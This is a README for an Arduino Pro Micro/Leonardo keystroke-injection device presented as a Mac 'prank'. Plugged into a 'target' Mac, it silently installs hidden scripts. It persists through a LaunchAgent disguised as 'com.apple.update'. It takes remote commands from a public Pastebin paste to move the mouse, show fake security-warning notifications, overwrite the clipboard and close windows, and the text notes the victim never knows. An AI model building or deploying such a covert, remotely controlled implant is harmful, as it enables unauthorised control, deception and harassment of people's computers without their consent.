# Mac Ultimate Prank — Arduino Pro Micro / Leonardo

Silently installs 12 background prank scripts the moment it's plugged in. Nothing happens immediately — you trigger pranks remotely by updating a Pastebin paste whenever you're ready. Every prank interval is fully customizable from Pastebin at trigger time.

---

## Hardware Required

- Arduino Pro Micro **or** Arduino Leonardo
- USB cable (plug into target's Mac)

---

## Setup

### 1. Create your own Pastebin

1. Go to [pastebin.com](https://pastebin.com) and create a **free account**
2. Click **New Paste**
3. Leave the content **blank** for now (or type anything that isn't a command word)
4. Set expiry to **Never** and visibility to **Public**
5. Click **Create New Paste**
6. Copy the 8-character ID from the URL — e.g. `pastebin.com/raw/XXXXXXXX` → your ID is `XXXXXXXX`

### 2. Add your Pastebin ID to the sketch

Open `sketch.ino` and find this line:

```
typeln("URL='https://pastebin.com/raw/XXXXXXXX'");
```

Replace `XXXXXXXX` with your actual Pastebin ID.

### 3. Flash the sketch

1. Open `sketch.ino` in the Arduino IDE
2. Set **Tools → Board** to `Arduino Leonardo` or `Arduino Pro Micro`
3. Set the correct **Port**
4. Click **Upload**

### 4. Plug into target Mac

- Plug the Arduino into the target Mac
- Wait ~15 seconds — Spotlight opens briefly, Terminal flickers, then minimises on its own
- All 12 prank scripts are now silently installed in `/tmp/`
- A hidden background watcher starts, checking your Pastebin every 5 minutes
- Remove the Arduino — the victim has no idea anything happened

> **Note:** The first run installs `pyobjc-framework-Quartz` (needed for the mouse teleporter). This requires an internet connection and may take 20–30 seconds.

---

## Triggering Pranks

Edit your Pastebin paste and save. The watcher checks every 5 minutes and launches the prank automatically.

### Command format

```
COMMAND
```
Uses the default interval for that prank.

```
COMMAND seconds
```
Runs the prank every N seconds. You control exactly how aggressive it is.

**Examples:**
```
MINIMISE 60        ← minimise every 60 seconds
VOLUME 30          ← random volume every 30 seconds
SPEECH 45          ← speak every 45 seconds
ACTIVATE 120       ← launch all 12 pranks, each running every 2 minutes
JIGGLE             ← mouse teleport on default 60s interval
STOP               ← kill everything
```

### All commands

| Command | Default | What happens |
|---|---|---|
| `ACTIVATE` | each prank's own default | Launches **all 12 pranks** at once |
| `JIGGLE` | 60s | Mouse teleports to a random position |
| `MINIMISE` | 180s | Cmd+M minimises the frontmost window |
| `SOUND` | 60s | Random macOS system sound |
| `NOTIFY` | 180s | Fake "Critical Error / Security Warning" notification |
| `CLIPBOARD` | 45s | Replaces clipboard with confusing messages |
| `ZOOM` | 90s | Cmd+= zooms in on the screen |
| `CAPS` | 60s | Caps lock toggled |
| `VOLUME` | 60s | Output volume set to a random level |
| `CLOSE` | 240s | Cmd+W closes the frontmost tab/window |
| `SPEECH` | 120s | Mac speaks: "Hi", "Message from PC"... |
| `DARK` | 300s | Dark/light mode flips |
| `INVERT` | 300s | Display colours inverted (Cmd+Option+Ctrl+8) |
| `STOP` | — | Kills all pranks, removes LaunchAgent, deletes all files |

---

## How Persistence Works

On first run, the watcher script (`/tmp/.t.py`) installs itself as a LaunchAgent at:

```
~/Library/LaunchAgents/com.apple.update.plist
```

It restarts automatically after every login until you send `STOP`.

---

## Stopping Everything

Put `STOP` in your Pastebin paste. Within 5 minutes the watcher will:
- Unload and delete the `com.apple.update` LaunchAgent
- Kill all running prank Python processes (`pkill -f`)
- Delete all 13 hidden `.py` files from `/tmp/`

---

## Requirements on Target Mac

- macOS 10.15 (Catalina) or later
- Python 3 installed — ships with Xcode Command Line Tools (macOS prompts automatically if missing)
- Internet connection required on first plug-in (for `pyobjc-framework-Quartz`)
- **System Events automation permission** — macOS may prompt the first time keyboard/mouse pranks run. If the target dismisses it, MINIMISE, ZOOM, CAPS, CLOSE, and INVERT will silently fail — all others still work
